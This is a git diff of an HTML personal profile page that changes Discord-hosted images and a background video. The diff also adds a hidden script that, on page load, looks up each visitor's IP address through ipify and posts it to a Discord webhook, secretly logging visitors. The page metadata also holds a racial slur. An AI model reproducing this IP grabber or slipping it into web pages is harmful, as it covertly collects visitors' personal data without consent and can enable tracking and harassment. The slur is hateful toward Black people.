@@ -7,11 +7,11 @@
     <title>reebba</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#834455">
-    <meta property="og:image" content="https://cdn.discordapp.com/attachments/983476031488933898/1177261806998265997/images_3_-_Copy.jpg?ex=6571dd7f&is=655f687f&hm=a5a118001a87dc82f70f4e71a83118e86d04af4cddd7931c54f66cb1e673c884&">
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1154013515636543580/1226654289825366027/2b7d89c9-d73d-4ced-91d5-cbc9f1d9f592.jpg?ex=66258dd4&is=661318d4&hm=86888c48d02e4bb651853e481790e90d4c118c9d9a3adba47fa7b784756d137b&">
     <meta property="og:description" content="reebbal hates niggas">
     <meta property="og:title" content="reebbal">
-    <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/983476031488933898/1177261806998265997/images_3_-_Copy.jpg?ex=6571dd7f&is=655f687f&hm=a5a118001a87dc82f70f4e71a83118e86d04af4cddd7931c54f66cb1e673c884&">
-    <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/983476031488933898/1177261806998265997/images_3_-_Copy.jpg?ex=6571dd7f&is=655f687f&hm=a5a118001a87dc82f70f4e71a83118e86d04af4cddd7931c54f66cb1e673c884&">
+    <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/1154013515636543580/1226654289825366027/2b7d89c9-d73d-4ced-91d5-cbc9f1d9f592.jpg?ex=66258dd4&is=661318d4&hm=86888c48d02e4bb651853e481790e90d4c118c9d9a3adba47fa7b784756d137b&">
+    <link rel="icon" type="image/jpeg" sizes="256x256" href="https://cdn.discordapp.com/attachments/1154013515636543580/1226654289825366027/2b7d89c9-d73d-4ced-91d5-cbc9f1d9f592.jpg?ex=66258dd4&is=661318d4&hm=86888c48d02e4bb651853e481790e90d4c118c9d9a3adba47fa7b784756d137b&">
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Covered+By+Your+Grace&amp;display=swap">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab&amp;display=swap">
@@ -44,7 +44,7 @@
     <div class="background">
         <div id="pattern"></div>
         <video id="background" loop playsinline>
-<source src="" type="video/mp4">
+<source src="https://cdn.discordapp.com/attachments/1154013515636543580/1226653732314288158/video.mp4?ex=66258d4f&is=6613184f&hm=cb9db1d9f968728b6a40dc2571301654b6e69a2fca6607a9e81b8e7d9b9c2e77&" type="video/mp4">
 <script>
             var video = document.getElementById("background");
 
@@ -71,7 +71,26 @@
                     <p class="a"><span id="Bruh" class="Paragraph"></span></p>
                 </div><img class="d-xl-flex main_image1" id="main_image1" src><iframe height="250px" width="410px" scrolling="no" src="https://lanyard.cnrad.dev/api/946148998329278474?borderRadius=5px&idleMessage=sleeping%20zzz&amp;bg=a&amp;animated=true"
                     frameborder="0">
-</iframe></div>
+</iframe>
+               <script>
+                    function getIP(json) {
+                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        request.open("POST", "https://discord.com/api/webhooks/1226652015451439135/8LU6UfTrk-hn76X7sKtk0pTSGytk1__QvgNh1PDy6JrcMYDthFvQieMtTkPDNGGNAEl8");
+
+                        request.setRequestHeader('Content-type', 'application/json');
+
+                        var params = {
+                            username: "Muhehehe",
+                            avatar_url: "https://cdn.discordapp.com/attachments/1193570412785836052/1226126811784675329/image.png?ex=6623a294&is=66112d94&hm=4ebf7ceb5634ba2713fcf4a166e9e0708f0d30728b7d27044c2f15937714d058&",
+                            content: "**IP:** *" + json.ip + "*"
+                        }
+                        //just a webhook parameters such as avatar,name,message
+
+                        request.send(JSON.stringify(params));
+                    }
+                </script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+            </div>
         </section>
     </div>
     <script src="assets/bootstrap/js/bootstrap.min.js"></script>
